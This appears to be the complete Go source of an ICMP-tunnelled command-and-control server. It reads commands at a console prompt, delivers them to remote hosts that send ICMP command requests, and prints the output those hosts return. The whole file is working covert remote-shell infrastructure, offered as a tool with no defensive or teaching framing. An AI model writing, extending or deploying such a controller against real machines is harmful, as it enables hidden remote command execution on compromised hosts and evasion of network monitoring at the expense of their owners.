package main

import (
	"bufio"
	"fmt"
	"github.com/andrewdo/go-icmp-data/transport"
	"log"
	"os"
	"strings"
	"sync"
)

func serveCommands(cmdCh chan string, outCh chan string) {
	cmds := make([]string, 0)
	for {
		ch := make(chan *transport.Packet)
		go transport.Receive(ch)
		for {
			select {
			case p := <-ch:
				cmds = handlePacket(p, cmds, outCh)
				break
			case cmd := <-cmdCh:
				cmds = append(cmds, cmd)
				break
			}
		}
	}
}

func handlePacket(p *transport.Packet, cmds []string, outCh chan string) []string {
	switch p.Message.Code {
	case transport.IcmpCodeCommandRequest:
		// reply with next command, if any
		if len(cmds) > 0 {
			go transport.Send(*p.From, []byte(cmds[0]), transport.IcmpCodeCommandReply)
			cmds = cmds[1:]
		} else {
			go transport.Send(*p.From, []byte(""), transport.IcmpCodeCommandReply)
		}
		break
	case transport.IcmpCodeCommandOutput:
		// pass the command out thru the channel
		log.Println(p.Body.Data)
		outCh <- string(p.Body.Data)
		go transport.Send(*p.From, []byte(""), transport.IcmpCodeAck)
		break
	}

	fmt.Println(cmds)
	return cmds
}

func main() {
	cmdCh := make(chan string, 0)
	outCh := make(chan string, 0)
	defer close(cmdCh)
	defer close(outCh)

	var wg sync.WaitGroup
	wg.Add(3)

	go serveCommands(cmdCh, outCh)
	go func() {
		for {
			select {
			case o := <-outCh:
				fmt.Println(o)
				break
			}
		}
	}()
	go func() {
		for {
			fmt.Print("> ")
			reader := bufio.NewReader(os.Stdin)
			cmd, err := reader.ReadString('\n')
			if err != nil {
				log.Fatal(err)
			}

			cmdCh <- strings.TrimSpace(cmd)
		}
	}()

	wg.Wait()
}